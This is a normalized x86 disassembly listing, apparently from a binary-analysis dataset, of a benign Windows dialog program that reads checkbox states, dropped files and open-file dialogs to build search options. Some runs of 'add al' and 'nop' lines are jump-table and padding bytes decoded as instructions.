mov edi [ esp + 0x10 ]
je r-xdata
mov eax [ esp + 0xc ]
lea ecx [ eax + edi ]
push ecx
dec eax
push eax
mov ecx esi
call sub_405bc0
test eax eax
je r-xdata
mov eax [ esi + 0x250 ]
mov ecx [ esi + 0x244 ]
mov edx [ esp + 0xc ]
push eax
push ecx
add edx edi
push edx
call sub_405ec0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov ecx [ esp + 0xc ]
mov al [ ecx ]
cmp al 0xa
je r-xdata
mov edi [ esi + 0x22c ]
push 0x0
inc edi
push esi
mov [ esi + 0x22c ] edi
call sub_4059a0
add esp 0x8
pop edi
pop esi
retn 0x8
mov ecx [ esi + 0x240 ]
mov edx [ esp + 0xc ]
add edi eax
mov eax [ esi + 0x24c ]
push eax
push ecx
dec edx
push edx
call sub_406040
add esp 0xc
cmp eax 0xffffffff
je r-xdata
inc ecx
mov [ esp + 0xc ] ecx
push ecx
mov ecx esi
call sub_406980
test eax eax
jne r-xdata
lea esp [ esp ]
sub [ esp + 0xc ] eax
add edi eax
pop edi
pop esi
retn 0x8
mov edi [ esi + 0x228 ]
push ebx
push eax
inc edi
push esi
mov [ esi + 0x228 ] edi
call sub_4059a0
add esp 0x8
mov ecx esi
mov edi 0x1
call sub_40bad0
xor ebx ebx
lea ebx [ ebx ]
dec ecx
mov [ esp + 0xc ] ecx
mov al [ ecx ]
cmp al 0xa
jne r-xdata
push 0xffffffff
mov ecx esi
call sub_40b700
mov ecx [ esp + 0x10 ]
push ecx
mov ecx esi
call sub_405760
pop ebx
mov al [ eax + 0x1 ]
cmp al 0xa
je r-xdata
cmp al 0xd
je r-xdata
cmp al 0xd
je r-xdata
lea edx [ esp + 0x10 ]
push edx
call sub_418b70
add esp 0x4
test edi edi
je r-xdata
cmp eax 0x2f
jne r-xdata
lea ecx [ eax - 0x20 ]
cmp ecx 0x3d
ja r-xdata
push eax
push 0x2c
mov ecx esi
call sub_40b760
push 0x20
jmp r-xdata
movzx ecx [ ecx + lookup_table_4074d8 ]
jmp [ ecx * 4 + jump_table_4074c4 ]
mov eax [ esp + 0x10 ]
cmp [ eax ] 0x0
je r-xdata
mov ecx esi
call sub_40b760
mov dl [ rw-data ]
neg dl
sbb edx edx
and edx 0xffffdf01
add edx 0x215a
push edx
jmp r-xdata
mov al [ rw-data ]
neg al
sbb eax eax
and eax 0xffffdf02
add eax 0x215b
push 0x9
jmp r-xdata
mov al [ rw-data ]
xor edi edi
test al al
jne r-xdata
inc ebx
cmp ebx 0x200
jl r-xdata
push 0xffffffff
mov ecx esi
call sub_40b700
jmp r-xdata
sub_4074dd
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add [ esp + eax ] eax
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x3
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
sub esp 0x40c
push ebx
push ebp
mov ebp [ ecx + 0x10 ]
mov eax ebp
cdq
push esi
sub eax edx
mov esi eax
push edi
lea eax [ esp + 0x1c ]
push eax
sar esi 0x1
push esi
mov [ esp + 0x20 ] ecx
mov [ esp + 0x1c ] 0x0
call sub_404a00
mov edi [ esp + 0x424 ]
mov ebx [ esp + 0x420 ]
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x21f ]
push edx
call sub_4046c0
lea ecx [ ebp - 0x1 ]
add esp 0x8
test ecx ecx
jle r-xdata
mov ecx rw-data
call sub_4056f0
test eax eax
jne r-xdata
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40c
retn 0x8
mov edi edi
mov ebp esi
mov [ esp + 0x14 ] esi
jmp r-xdata
mov edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x21f ]
push eax
mov ecx rw-data
call sub_407310
mov ecx rw-data
inc ebp
call sub_4056f0
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
lea eax [ edx + ebp ]
cdq
sub eax edx
mov esi eax
lea eax [ esp + 0x1c ]
push eax
sar esi 0x1
push esi
call sub_404a00
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x21f ]
push edx
call sub_4046c0
mov edx [ esp + 0x1c ]
lea ecx [ ebp - 0x1 ]
add esp 0x8
cmp edx ecx
jl r-xdata
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x1c ]
push edx
push ebp
call sub_404a00
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x21f ]
push ecx
call sub_4046c0
add esp 0x8
test eax eax
jne r-xdata
sub_407630
sub esp 0x204
push esi
mov esi [ ecx + 0x14 ]
mov al [ esi + 0x1 ]
inc esi
test al al
je r-xdata
pop esi
add esp 0x204
retn 0x8
push ebx
mov ebx [ esp + 0x210 ]
push edi
mov edi [ esp + 0x218 ]
movzx eax [ esi ]
call sub_404740
add esi eax
cmp [ esi ] 0x0
jne r-xdata
xor edx edx
mov ecx esi
lea esp [ esp ]
lea eax [ esp + 0xc ]
push eax
push esi
call sub_4046c0
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop ebx
sub ecx esi
mov [ esp + 0x10 ] 0xa
lea edx [ esp + ecx + 0x10 ]
mov eax 0x1
inc esi
cmp al 0xd
je r-xdata
mov ecx [ esp + 0xc ]
push ecx
push edx
mov ecx rw-data
mov [ esp + eax + 0x18 ] 0xa
call sub_407310
cmp cl 0xd
je r-xdata
dec esi
inc edx
cmp edx 0x1f7
jl r-xdata
mov [ esp + eax + 0x10 ] cl
inc eax
inc esi
cmp eax 0x1fe
jl r-xdata
mov al [ esi ]
cmp al 0xa
je r-xdata
mov cl [ esi ]
cmp cl 0xa
je r-xdata
sub_407740
mov eax [ esp + 0x8 ]
cmp eax 0x110
push esi
push edi
mov edi ecx
jg r-xdata
cmp eax 0x233
jg r-xdata
je r-xdata
cmp eax 0x40d
jne r-xdata
je r-xdata
mov esi [ esp + 0xc ]
push 0x0
push 0x0
push 0x1
push rw-data
push 0x7d0
push esi
mov ecx rw-data
call sub_4206e0
push 0x0
push esi
mov [ edi + 0x224 ] esi
call sub_4258a0
push 0x664
call sub_42991a
add esp 0xc
test eax eax
je r-xdata
add eax 0xfffffffe
cmp eax 0x51
ja r-xdata
pop edi
xor eax eax
pop esi
retn 0x10
mov edx [ rw-data ]
cmp [ edx + 0x21e ] 0x0
jne r-xdata
mov ecx [ esp + 0x14 ]
push ecx
mov ecx [ rw-data ]
call sub_40aa60
pop edi
xor eax eax
pop esi
retn 0x10
cmp eax 0x111
je r-xdata
pop edi
mov [ rw-data ] 0x0
xor eax eax
pop esi
retn 0x10
mov [ eax ] r--data
mov edx [ edi + 0x210 ]
mov ecx [ edx + 0x14 ]
push 0xea
push ecx
push esi
mov ecx eax
mov [ rw-data ] eax
call sub_40d910
pop edi
mov eax 0x1
pop esi
retn 0x10
movzx eax [ eax + lookup_table_407a38 ]
jmp [ eax * 4 + jump_table_407a24 ]
mov ecx [ esp + 0xc ]
push 0x23
push 0x102
push 0x101
push ecx
call sub_420e20
add esp 0x10
sub eax 0x2
je r-xdata
mov eax [ esp + 0x18 ]
pop edi
mov [ eax ] 0x1
xor eax eax
pop esi
retn 0x10
mov ecx [ esp + 0x14 ]
movzx eax cx
cmp eax 0x690
jg r-xdata
cmp eax 0x214
jne r-xdata
mov ecx [ rw-data ]
cmp [ ecx + 0x21e ] 0x0
mov esi [ esp + 0xc ]
je r-xdata
mov eax [ esp + 0x14 ]
push eax
mov ecx rw-data
call sub_420810
pop edi
xor eax eax
pop esi
retn 0x10
mov ecx rw-data
call sub_4207d0
pop edi
xor eax eax
pop esi
retn 0x10
mov ecx [ esp + 0xc ]
push 0x705
push ecx
call sub_414bc0
add esp 0x8
pop edi
mov eax 0x1
pop esi
retn 0x10
mov eax [ esp + 0x18 ]
pop edi
mov [ eax ] 0x0
xor eax eax
pop esi
retn 0x10
sub eax 0x4
mov esi [ esp + 0x18 ]
je r-xdata
cmp eax 0x7d0
jl r-xdata
je r-xdata
mov edx [ esp + 0x18 ]
push edx
mov ecx rw-data
call sub_4209c0
pop edi
xor eax eax
pop esi
retn 0x10
push esi
call [ GetParent@IAT ]
push eax
call [ SetFocus@IAT ]
push esi
mov [ edi + 0x224 ] 0x0
call sub_4258e0
mov edx [ rw-data ]
push edx
call j_sub_429931
add esp 0x8
pop edi
mov eax 0x1
pop esi
retn 0x10
push 0x34
push 0x102
push 0x101
push esi
call sub_420e20
add esp 0x10
cmp eax 0x6
jne r-xdata
mov ecx edi
call sub_4054f0
neg eax
sbb eax eax
inc eax
mov [ esi ] eax
dec eax
jne r-xdata
cmp eax 0x7d9
jg r-xdata
mov eax [ rw-data ]
mov ecx [ eax + 0xc ]
push sub_405d80
call sub_40b340
pop edi
xor eax eax
pop esi
retn 0x10
dec eax
je r-xdata
mov ecx edi
call sub_4054f0
mov ecx [ rw-data ]
mov [ ecx + 0x21e ] 0x0
cmp [ esi ] 0x0
je r-xdata
mov edx esi
mov [ edx ] 0x1
jmp r-xdata
push ecx
mov ecx [ rw-data ]
call sub_40d580
pop edi
xor eax eax
pop esi
retn 0x10
mov eax [ rw-data ]
cmp [ eax + 0x21e ] 0x0
je r-xdata
dec eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ rw-data ]
push edx
mov [ ecx + 0x21e ] 0x0
call [ DestroyWindow@IAT ]
pop edi
xor eax eax
pop esi
retn 0x10
mov ecx edi
call sub_4054f0
test eax eax
jne r-xdata
pop edi
xor eax eax
pop esi
retn 0x10
sub_407a3d
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add edx [ eax - 0x6f6f6f70 ]
nop
sub_407a90
push ebx
push esi
mov esi ecx
mov al [ esi + 0x23a ]
test al al
mov ebx [ esi + 0x254 ]
push edi
mov edi [ esp + 0x10 ]
je r-xdata
add ebx edi
push ebx
lea eax [ edi - 0x1 ]
push eax
mov ecx esi
call sub_405bc0
test eax eax
je r-xdata
mov eax [ esi + 0x250 ]
mov ecx [ esi + 0x244 ]
push eax
push ecx
lea edx [ ebx + edi ]
push edx
call sub_404070
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov al [ edi ]
cmp al 0xa
je r-xdata
mov edi [ esi + 0x22c ]
push 0x0
inc edi
push esi
mov [ esi + 0x22c ] edi
call sub_4059a0
add esp 0x8
pop edi
pop esi
pop ebx
retn 0x4
mov ecx [ esi + 0x240 ]
add ebx eax
mov eax [ esi + 0x24c ]
push eax
push ecx
lea edx [ edi - 0x1 ]
push edx
call sub_404200
add esp 0xc
cmp eax 0xffffffff
je r-xdata
inc edi
push edi
mov ecx esi
call sub_406980
test eax eax
jne r-xdata
cmp al 0xd
je r-xdata
sub edi eax
add ebx eax
pop edi
pop esi
pop ebx
retn 0x4
mov ebx [ esi + 0x228 ]
push eax
inc ebx
push esi
mov [ esi + 0x228 ] ebx
call sub_4059a0
mov ecx [ esi + 0x218 ]
movzx edx [ ecx + 0x20 ]
push edx
push 0x0
mov eax edi
call sub_4043a0
add esp 0x10
push edi
mov ecx esi
call sub_405760
mov al [ edi - 0x1 ]
dec edi
cmp al 0xa
jne r-xdata
sub_407b80
sub esp 0x404
push ebx
push ebp
push esi
push edi
mov ebp ecx
mov edi [ ebp + 0x10 ]
mov eax edi
cdq
sub eax edx
mov esi eax
lea eax [ esp + 0x14 ]
push eax
sar esi 0x1
push esi
mov [ esp + 0x18 ] 0x0
call sub_404a00
mov ecx [ esp + 0x418 ]
mov ebx [ esp + 0x41c ]
push ecx
lea eax [ esp + 0x217 ]
call sub_404000
lea edx [ edi - 0x1 ]
add esp 0x4
test edx edx
jle r-xdata
mov ecx rw-data
call sub_4056f0
test eax eax
jne r-xdata
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x404
retn 0x8
lea edx [ esp + 0x14 ]
push edx
push edi
mov ecx ebp
call sub_404a00
mov eax [ esp + 0x418 ]
push eax
lea eax [ esp + 0x217 ]
call sub_404000
add esp 0x4
test eax eax
jne r-xdata
mov edi esi
mov [ esp + 0x10 ] esi
jmp r-xdata
lea ecx [ esp + 0x213 ]
push ecx
mov ecx rw-data
call sub_407a90
mov ecx rw-data
inc edi
call sub_4056f0
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
add eax edi
cdq
sub eax edx
mov esi eax
lea ecx [ esp + 0x14 ]
push ecx
sar esi 0x1
push esi
mov ecx ebp
call sub_404a00
mov edx [ esp + 0x418 ]
push edx
lea eax [ esp + 0x217 ]
call sub_404000
mov edx [ esp + 0x14 ]
lea ecx [ edi - 0x1 ]
add esp 0x4
cmp edx ecx
jl r-xdata
sub_407c80
sub esp 0x200
push esi
mov esi [ ecx + 0x14 ]
mov al [ esi + 0x1 ]
inc esi
test al al
je r-xdata
pop esi
add esp 0x200
retn 0x8
push ebx
mov ebx [ esp + 0x210 ]
push edi
mov edi [ esp + 0x210 ]
xor edx edx
mov ecx esi
cmp [ esi ] 0x80
jb r-xdata
sub ecx esi
mov [ esp + 0xc ] 0xa
lea edx [ esp + ecx + 0xc ]
mov eax 0x1
inc esi
cmp al 0xd
je r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
inc esi
jmp r-xdata
push edx
mov ecx rw-data
mov [ esp + eax + 0x10 ] 0xa
call sub_407a90
cmp cl 0xd
je r-xdata
dec esi
inc edx
cmp edx 0x1f7
jl r-xdata
push edi
mov eax esi
call sub_404000
add esp 0x4
test eax eax
je r-xdata
pop edi
pop ebx
mov [ esp + eax + 0xc ] cl
inc eax
inc esi
cmp eax 0x1fe
jl r-xdata
mov al [ esi ]
cmp al 0xa
je r-xdata
mov cl [ esi ]
cmp cl 0xa
je r-xdata
sub_407d30
push ecx
mov al [ edi ]
push esi
xor esi esi
test al al
mov ecx 0x1
mov edx edi
je r-xdata
mov eax esi
sub eax 0x0
je r-xdata
movsx eax al
add eax 0xffffffbe
cmp eax 0x13
ja r-xdata
mov eax ecx
sub eax 0x2
push 0x28
je r-xdata
dec eax
je r-xdata
mov al [ edx + 0x1 ]
inc edx
test al al
jne r-xdata
movzx eax [ eax + lookup_table_407e68 ]
jmp [ eax * 4 + jump_table_407e54 ]
call sub_42991a
add esp 0x4
test eax eax
je r-xdata
dec eax
je r-xdata
mov eax ecx
sub eax 0x2
push 0x28
je r-xdata
dec eax
je r-xdata
mov ecx 0x2
jmp r-xdata
mov ecx 0x3
jmp r-xdata
mov esi 0x1
jmp r-xdata
mov esi 0x2
xor esi esi
mov ecx eax
call sub_407700
mov esi eax
jmp r-xdata
call sub_42991a
add esp 0x4
test eax eax
je r-xdata
call sub_42991a
add esp 0x4
test eax eax
je r-xdata
call sub_42991a
add esp 0x4
test eax eax
je r-xdata
dec eax
je r-xdata
mov esi [ esp + 0x4 ]
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push edi
push ecx
push edx
mov ecx esi
call sub_404ae0
mov eax esi
pop esi
pop ecx
retn
mov ecx eax
call sub_4076f0
mov esi eax
jmp r-xdata
mov ecx eax
call sub_4076e0
mov esi eax
jmp r-xdata
mov ecx eax
call sub_407730
mov esi eax
jmp r-xdata
call sub_42991a
add esp 0x4
test eax eax
je r-xdata
call sub_42991a
add esp 0x4
test eax eax
je r-xdata
mov ecx eax
call sub_407720
mov esi eax
jmp r-xdata
mov ecx eax
call sub_407710
mov esi eax
jmp r-xdata
sub_407e6d
add al 0x4
add [ esp + eax ] eax
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x3
nop
nop
nop
nop
sub esp 0x404
push ebx
push ebp
push esi
push edi
mov ebp ecx
mov edi [ ebp + 0x10 ]
mov eax edi
cdq
sub eax edx
mov esi eax
lea eax [ esp + 0x14 ]
push eax
sar esi 0x1
push esi
mov [ esp + 0x18 ] 0x0
call sub_404a00
mov ecx [ esp + 0x41c ]
mov ebx [ esp + 0x418 ]
push ecx
lea eax [ esp + 0x217 ]
call sub_405d10
lea edx [ edi - 0x1 ]
add esp 0x4
test edx edx
jle r-xdata
mov ecx rw-data
call sub_4056f0
test eax eax
jne r-xdata
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x404
retn 0x8
lea edx [ esp + 0x14 ]
push edx
push edi
mov ecx ebp
call sub_404a00
mov eax [ esp + 0x41c ]
push eax
lea eax [ esp + 0x217 ]
call sub_405d10
add esp 0x4
test eax eax
jne r-xdata
mov edi esi
mov [ esp + 0x10 ] esi
jmp r-xdata
lea ecx [ esp + 0x213 ]
push ecx
mov ecx rw-data
call sub_407a90
mov ecx rw-data
inc edi
call sub_4056f0
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
add eax edi
cdq
sub eax edx
mov esi eax
lea ecx [ esp + 0x14 ]
push ecx
sar esi 0x1
push esi
mov ecx ebp
call sub_404a00
mov edx [ esp + 0x41c ]
push edx
lea eax [ esp + 0x217 ]
call sub_405d10
mov edx [ esp + 0x14 ]
lea ecx [ edi - 0x1 ]
add esp 0x4
cmp edx ecx
jl r-xdata
sub_407f80
sub esp 0x200
push esi
mov esi [ ecx + 0x14 ]
mov al [ esi + 0x1 ]
inc esi
test al al
je r-xdata
pop esi
add esp 0x200
retn 0x8
push ebx
mov ebx [ esp + 0x20c ]
push edi
mov edi [ esp + 0x214 ]
xor edx edx
mov ecx esi
cmp [ esi ] 0x80
jb r-xdata
sub ecx esi
mov [ esp + 0xc ] 0xa
lea edx [ esp + ecx + 0xc ]
mov eax 0x1
inc esi
cmp al 0xd
je r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
inc esi
jmp r-xdata
push edx
mov ecx rw-data
mov [ esp + eax + 0x10 ] 0xa
call sub_407a90
cmp cl 0xd
je r-xdata
dec esi
inc edx
cmp edx 0x1f7
jl r-xdata
push edi
mov eax esi
call sub_405d10
add esp 0x4
test eax eax
je r-xdata
pop edi
pop ebx
mov [ esp + eax + 0xc ] cl
inc eax
inc esi
cmp eax 0x1fe
jl r-xdata
mov al [ esi ]
cmp al 0xa
je r-xdata
mov cl [ esi ]
cmp cl 0xa
je r-xdata
sub_408030
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
pop esi
retn
jmp r-xdata
mov eax [ esi + 0x4 ]
mov ecx esi
mov [ rw-data ] eax
call sub_4049b0
mov ecx esi
call sub_4061e0
push esi
call j_sub_429931
mov esi [ rw-data ]
add esp 0x4
test esi esi
jne r-xdata
sub_408070
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
sub esp 0x200
push esi
push edi
mov edi [ esp + 0x218 ]
push eax
push ecx
call sub_407d30
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov eax [ esp + 0x20c ]
mov ecx [ eax ]
test ecx ecx
jne r-xdata
pop edi
mov eax 0x1
pop esi
add esp 0x200
retn 0x14
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov [ eax ] esi
jmp r-xdata
mov [ ecx + 0x4 ] esi
nop
push ebx
mov ecx esi
call sub_404ac0
mov bl [ esp + 0x220 ]
test bl 0x1
mov edi eax
je r-xdata
test bl 0x2
pop ebx
je r-xdata
push edi
call sub_420ac0
add esp 0x4
test eax eax
je r-xdata
mov ecx eax
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
pop edi
xor eax eax
pop esi
add esp 0x200
retn 0x14
lea ecx [ esp + 0x8 ]
mov eax edi
call sub_404500
push eax
call sub_420ac0
add esp 0x4
test eax eax
je r-xdata
mov [ esi + 0x24 ] 0x1
mov [ esi + 0x21 ] 0x1
sub_408130
push esi
push edi
push 0xc8
mov esi ecx
call sub_420ca0
mov cl [ eax ]
mov edi [ esp + 0x10 ]
add esp 0x4
cmp cl 0x2e
je r-xdata
push 0x1
push r--data
push r--data
push 0xc9
call sub_420ca0
add esp 0x4
push eax
push edi
mov ecx esi
call sub_408070
push 0x0
push r--data
push r--data
push 0xca
call sub_420ca0
add esp 0x4
push eax
push edi
mov ecx esi
call sub_408070
push 0x0
push r--data
push r--data
push 0xcb
call sub_420ca0
add esp 0x4
push eax
push edi
mov ecx esi
call sub_408070
push 0x0
push r--data
push r--data
push 0xcc
call sub_420ca0
add esp 0x4
push eax
push edi
mov ecx esi
call sub_408070
pop edi
pop esi
retn 0x4
push 0x2
push r--data
push eax
push eax
push edi
mov ecx esi
call sub_408070
sub_408200
sub esp 0x414
push ebx
push edi
mov edi [ IsDlgButtonChecked@IAT ]
push 0x42d
push esi
call edi
test eax eax
je r-xdata
push 0x42e
push esi
call edi
test eax eax
mov [ esp + 0x8 ] 0x4d
jne r-xdata
mov [ esp + 0x8 ] 0x55
jmp r-xdata
push 0x426
push esi
lea ebx [ esp + 0x11 ]
call edi
test eax eax
je r-xdata
mov [ esp + 0x8 ] 0x45
push 0x430
push esi
call edi
test eax eax
je r-xdata
mov [ esp + 0x9 ] 0x49
jmp r-xdata
push 0x427
push esi
call edi
test eax eax
je r-xdata
mov [ esp + 0x9 ] 0x42
lea ebx [ esp + 0xa ]
push 0x425
push esi
call edi
test eax eax
je r-xdata
mov [ ebx ] 0x4f
jmp r-xdata
push 0x424
push esi
call edi
test eax eax
je r-xdata
mov [ ebx ] 0x4e
inc ebx
push 0x433
push esi
call edi
test eax eax
je r-xdata
mov [ ebx ] 0x53
inc ebx
push 0x432
push esi
call edi
test eax eax
je r-xdata
mov [ ebx ] 0x63
inc ebx
push 0x437
push esi
call edi
test eax eax
je r-xdata
mov [ ebx ] 0x75
inc ebx
push 0x434
push esi
call edi
test eax eax
je r-xdata
mov [ ebx ] 0x51
inc ebx
mov edi [ GetDlgItemTextA@IAT ]
push 0x200
lea eax [ esp + 0x220 ]
push eax
push 0x42b
push esi
mov [ ebx ] 0x0
call edi
push 0x200
lea ecx [ esp + 0x20 ]
push ecx
push 0x429
push esi
call edi
lea edi [ esp + 0x1c ]
call sub_4055a0
push eax
lea edx [ esp + 0x220 ]
push edx
lea edi [ esp + 0x10 ]
call sub_407d30
add esp 0x8
pop edi
pop ebx
add esp 0x414
retn
mov [ ebx ] 0x4b
inc ebx
sub_408330
mov eax [ esp + 0x8 ]
sub esp 0x24c
cmp eax 0x111
push ebx
push ebp
push esi
push edi
mov ebp ecx
jg r-xdata
cmp eax 0x233
jne r-xdata
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x24c
retn 0x10
mov esi [ esp + 0x268 ]
push 0x200
lea edx [ esp + 0x60 ]
push edx
push 0x0
push esi
call [ DragQueryFileA@IAT ]
test eax eax
jbe r-xdata
movzx eax [ esp + 0x268 ]
cmp eax 0x42a
jg r-xdata
cmp eax 0x53
je r-xdata
push esi
call [ DragFinish@IAT ]
mov ecx [ esp + 0x260 ]
push 0x3
push 0x0
push 0x110
lea eax [ esp + 0x68 ]
push ecx
mov [ ebp + 0x21c ] eax
call [ SendMessageA@IAT ]
sub eax 0x42c
cmp eax 0xa
ja r-xdata
je r-xdata
mov ecx [ esp + 0x260 ]
push 0x70d
push ecx
call sub_414bc0
add esp 0x8
cmp eax 0x110
jne r-xdata
movzx ecx [ eax + lookup_table_40896c ]
jmp [ ecx * 4 + jump_table_408960 ]
mov esi [ esp + 0x260 ]
xor eax eax
mov ecx 0x13
lea edi [ esp + 0x10 ]
[ edi ]
call sub_408200
mov [ ebp + 0x214 ] eax
mov ecx [ eax + 0x18 ]
cmp [ ecx ] 0x0
jne r-xdata
dec eax
je r-xdata
mov ebx [ esp + 0x26c ]
cmp ebx 0x1
je r-xdata
mov esi [ esp + 0x260 ]
call sub_408200
mov [ ebp + 0x214 ] eax
mov ecx eax
mov esi [ esp + 0x260 ]
call sub_408200
push esi
mov ecx eax
mov [ ebp + 0x214 ] eax
call sub_4063c0
mov ecx [ ebp + 0x214 ]
push 0x1
push esi
call sub_406220
mov edi [ CheckDlgButton@IAT ]
push 0x1
push 0x425
push esi
call edi
push 0x0
push 0x427
push esi
call edi
push 0x0
push 0x431
push esi
call edi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x24c
retn 0x10
mov ecx eax
call sub_404ac0
push eax
lea edx [ esp + 0x60 ]
push edx
call [ lstrcpyA@IAT ]
mov [ esp + 0x5c ] 0x0
jmp r-xdata
mov esi [ esp + 0x260 ]
call sub_408200
mov ebx [ lstrlenA@IAT ]
mov [ ebp + 0x214 ] eax
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x214 ]
mov ecx [ eax + 0x18 ]
mov esi [ esp + 0x260 ]
mov edi [ SetDlgItemTextA@IAT ]
push ecx
push 0x42b
push esi
call edi
mov edx [ ebp + 0x214 ]
mov eax [ edx + 0x1c ]
push eax
push 0x429
push esi
call edi
mov ecx [ ebp + 0x214 ]
movzx edx [ ecx + 0x24 ]
mov edi [ CheckDlgButton@IAT ]
push edx
push 0x424
push esi
call edi
mov eax [ ebp + 0x214 ]
movzx ecx [ eax + 0x26 ]
push ecx
push 0x434
push esi
call edi
mov edx [ ebp + 0x214 ]
movzx eax [ edx + 0x27 ]
push eax
push 0x437
push esi
call edi
mov ecx [ ebp + 0x214 ]
mov al [ ecx + 0x23 ]
xor edx edx
mov ebx 0x2
cmp al bl
sete dl
push edx
push 0x432
push esi
call edi
mov eax [ ebp + 0x214 ]
mov dl [ eax + 0x23 ]
xor ecx ecx
cmp dl 0x1
sete cl
push ecx
push 0x433
push esi
call edi
mov edx [ ebp + 0x214 ]
movzx eax [ edx + 0x20 ]
sub eax ebx
je r-xdata
jle r-xdata
mov ecx ebp
call sub_4061e0
push ebp
call j_sub_429931
add esp 0x4
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x24c
retn 0x10
mov eax [ rw-data ]
push 0x0
push 0xf1
mov [ esp + 0x18 ] 0x4c
mov [ esp + 0x1c ] esi
mov [ esp + 0x20 ] eax
call sub_420f10
add esp 0x8
lea edx [ esp + 0x10 ]
lea ecx [ esp + 0x5c ]
push edx
mov [ esp + 0x20 ] eax
mov [ esp + 0x2c ] 0x1
mov [ esp + 0x30 ] ecx
mov [ esp + 0x34 ] 0x200
mov [ esp + 0x48 ] 0x81804
call [ GetOpenFileNameA@IAT ]
test eax eax
je r-xdata
mov ecx edi
call sub_4061e0
push edi
call j_sub_429931
add esp 0x4
mov edi [ ebp + 0x214 ]
test edi edi
je r-xdata
xor edi edi
push eax
call ebx
mov edi eax
jmp r-xdata
mov edx [ esp + 0x260 ]
push 0x0
push edx
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x24c
retn 0x10
sub eax 0x3e5
jne r-xdata
mov eax 0x42d
dec eax
je r-xdata
cmp ebx 0x3
jg r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x24c
retn 0x10
push 0x3
push 0x0
push 0x110
lea eax [ esp + 0x68 ]
push esi
mov [ ebp + 0x21c ] eax
call [ SendMessageA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x24c
retn 0x10
xor eax eax
push eax
call ebx
jmp r-xdata
mov eax [ ebp + 0x214 ]
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
mov dl [ eax + 0x25 ]
xor ecx ecx
test dl dl
setne cl
add ecx 0x42f
mov eax ecx
mov eax 0x426
jmp r-xdata
mov eax 0x42e
jmp r-xdata
mov eax 0x42c
jmp r-xdata
mov edi [ ebp + 0x21c ]
call sub_4055a0
mov esi [ esp + 0x260 ]
push eax
push 0x429
push esi
call [ SetDlgItemTextA@IAT ]
mov edi [ CheckDlgButton@IAT ]
push 0x1
push 0x425
push esi
call edi
push 0x0
push 0x427
push esi
call edi
push 0x0
push 0x431
push esi
call edi
call sub_408200
push esi
mov ecx eax
mov [ ebp + 0x214 ] eax
call sub_4063c0
mov ecx [ ebp + 0x214 ]
push 0x1
push esi
call sub_406220
mov ebp [ ebp + 0x214 ]
test ebp ebp
je r-xdata
push 0x30
push 0xec
push 0xf2
push esi
call sub_420e20
add esp 0x10
xor eax eax
test edi edi
sete al
lea eax [ eax + eax + 0x429 ]
push eax
push esi
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x24c
retn 0x10
test eax eax
je r-xdata
test edi edi
je r-xdata
mov eax 0x431
sub eax ebx
je r-xdata
push 0x1
push eax
push esi
call edi
mov edx [ ebp + 0x214 ]
movzx eax [ edx + 0x22 ]
sub eax 0x0
je r-xdata
push 0x1
push eax
push esi
call edi
mov eax [ ebp + 0x214 ]
mov cl [ eax + 0x21 ]
test cl cl
je r-xdata
cmp ebx 0x2
jne r-xdata
mov ecx ebp
call sub_4061e0
push ebp
call j_sub_429931
add esp 0x4
mov ecx [ ebp + 0x214 ]
call sub_404ac0
lea ecx [ esp + 0x5c ]
call sub_404500
mov ecx [ ebp + 0x214 ]
call sub_404ac0
push eax
call sub_420ac0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ ebp + 0x214 ]
jmp r-xdata
